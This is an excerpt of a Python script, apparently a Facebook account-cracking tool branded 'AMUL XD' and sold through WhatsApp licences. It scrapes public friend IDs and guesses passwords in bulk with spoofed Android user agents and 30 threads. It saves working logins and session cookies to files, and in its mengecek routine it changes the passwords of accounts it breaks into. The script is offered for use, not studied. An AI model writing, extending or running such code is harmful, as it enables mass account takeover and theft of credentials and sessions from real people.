...
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 11; C5L Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android 12; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
...
try:
   ...
   prints(nel(f"{P2}You are not connected to the internet, please check your internet connection🔰",width=80,padding=(0,2),style=f"{color_panel}"));exit()
...
██║░░██║██║░╚═╝░██║╚██████╔╝███████╗
╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░╚══════╝
         Made By {M2} Nepali🇳🇵 {P2}Coder""",width=80,style=f"{color_panel}"))
def info():
	prints(f"""{B2}╭─────────────────────╮{B2}╭───────────────╮
{B2}│ {P2}Author : AMUL XD{B2} │{B2}│ {P2}Version : 1.0{B2} │
{B2}╰─────────────────────╯{B2}╰───────────────╯""")
def banner():
	clear()
	prints(nel(f"""\t {color_text} 
 __    __     __    __     ______     ______   _____
...
def login():
	try:
		...
		try:
			...
			print('╰─Your Internet Does not Have Stupid')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		...
		print(f'\033[0m╰─ Login Token/Cookie Expired')
		exit()
def menu(my_name,my_id):
	...
	try:AMULXd = cek_data["isp"]
	except:AMULXd = {'-'}
	try:AMULSu = cek_data["city"]
	except:AMULSu = {'-'}
	info() 
	prints(nel(f'{P2}Login As %s %s{P2}'%((my_id),AMULSu),width=80,padding=(0,7),style=f"{color_panel}")) 
	prints(nel(f"""{P2}
 [{color_text}01{P2}]. Crack Public         
 [{color_text}04{P2}]. Cek Hasil
 [{color_text}02{P2}]. Crack Public  
 [{color_text}05{P2}]. Cek Tap Yes
 [{color_text}03{P2}]. Crack File           
 [{color_text}00{P2}]. Exit\n [{color_text}06{P2}]. Scrap Set Post""",width=80,padding=(0,7),style=f"{color_panel}"))
	AMUL = input(' Chouse : ')
	print('')
	if AMUL in ['1']:
		dump_publik()
...
def error():
	...
	back()
def ganti_tema():
		prints(nel(f""" Ahile yo tool available xina """,width=80,padding=(0,7),style=f"{color_panel}"))
		sleep(2) 
		back()
def dump_publik():
	try:
		...
		exit()
	prints(nel(f'{K2} type {P2}"\033[32mMe\033[0m" {K2}Afno sathi id hack garne ho       {P2}',width=90,padding=(0,9),style=f"{color_panel}")) 
	...
	try:
		...
		print('╰─ Ta Snaga net xina bhikaare')
		exit()
	except (KeyError,IOError):
		print('╰─Friendship Unpublished Your Cookie And Token Rotten')
		exit()
...
def result():
	...
	if kz in ['1','01']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('╰─ results Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
{B2}.     """)
	...
	print('')
	prints(nel(f'''\t{P2}[{H2}1{P2}] New method \t[{H2}2{P2}] Old method\n\t[{H2}3{P2}] Metode Mix"''',width=80,style=f"{color_panel}")) 
	hc = input('[•] Pilih  : ')
	if hc in ['1','01']:
	...
	su() 
def su():
	prints(nel(f"\t{P2}[{H2}1{P2}].   321 + 123 + 12345 [ {K2}One(best) {P2}]\n\t[{H2}2{P2}].   123 + 12345 + 123456 [ {M2}Two(slow){P2}]\n\t[{H2}3{P2}].   123 + 1234 + 12345 [{H2} Third{P2}]\n\t[{H2}4{P2}].   123 + 12345 [{H2} Forth {P2}]",width=80,style=f"{color_panel}")) 
	ch = input('[•] Pilih  : ')
	if ch in ['1','01']:
		babi()
	elif ch in ['2','02']:
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'mobile' in method:
					...
					pool.submit(crack,idf,pwv)
		print('')
		cetak('╰─ Sucses Cracked %s Ok:%s Cp:%s Account'%((len(id)),ok,cp))
		print('')
def passu():
	global prog,des
	print('')
	...
	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print('') 
	prints(f' Use flight mode if ld are not coming\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'\r[deep_white] Coke Api  {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
...
def getkey():
    ...
    try:
        ...
        none();time.sleep(1)
        print("")
        print("\033[0m╰─ Authour AMUL XD TOD ")
        print("\033[0m╰─ License results Tidak Tersedia ");time.sleep(2)
        print ("")
        jalan("\033[0m╰─ license results :\033[32m "+crot);time.sleep(1)
        namamu = input("\033[0m╰─ nama results : ")
        yt = input("\033[0m╰─ Chat Admin Untuk Beli Lisensi y/t? > ")
        if yt in ["Y","y"]:
            os.system("xdg-open https://wa.me/+9765223785?text=Assalamualaikum+bang+AMUL,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfitmasi+nama+pembeli:%20"+namamu)
...
def opsi():
	...
	pw=input("\n%s%s%s \033[0mubahId pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukanId %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%sId minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		if "Akun results Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan results login "%(til,H))
		...
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini results?" in title:
				if "ubah_sandi" in ubah_pass:
					...
					if "Buat KataId Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab,Id berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan results login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			...
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan results login "%(H))
		...
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kataId"%(M))
